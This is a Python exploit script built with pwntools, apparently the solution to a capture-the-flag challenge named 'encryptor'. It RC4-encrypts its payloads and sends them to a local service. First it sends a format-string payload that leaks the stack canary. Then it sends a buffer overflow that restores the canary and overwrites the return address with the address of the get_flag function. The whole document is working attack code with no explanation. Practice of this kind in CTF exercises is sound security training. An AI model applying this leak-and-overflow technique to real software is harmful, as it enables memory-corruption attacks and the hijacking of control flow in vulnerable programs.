import sys
from Crypto.Cipher import ARC4
from pwn import *


KEY = b"AAABC"
OFFSET = 264


def enc(payload):
    rc4 = ARC4.new(KEY)
    ctxt = rc4.encrypt(payload)
    return ctxt


context.log_level = "error"
# context.log_level = "debug"

binary = ELF("../challenge/encryptor")

get_flag_addr = binary.symbols["get_flag"]
print(f"get_flag_addr: 0x{get_flag_addr:016x}")

t = remote("127.0.0.1", 1234)
# t = process("../challenge/encryptor")
# print(f"pid: {t.pid}")
# pause()

t.recvuntil("Key: \n")
t.sendline(b"AAABC")

payload = b"%73$p|"
enc_payload = enc(payload)

t.recvuntil("Data: \n")
t.sendline(enc_payload)

buff = t.recvuntil(b"|").strip(b"|")
print(f"canary: {buff}")
canary = int(buff, 16)

payload = b"A" * OFFSET + p64(canary) + b"B" * 8 + p64(get_flag_addr)
enc_payload = enc(payload)

t.recvuntil("Data: \n")
t.sendline(enc_payload)

buff = t.recvall()
print(buff)
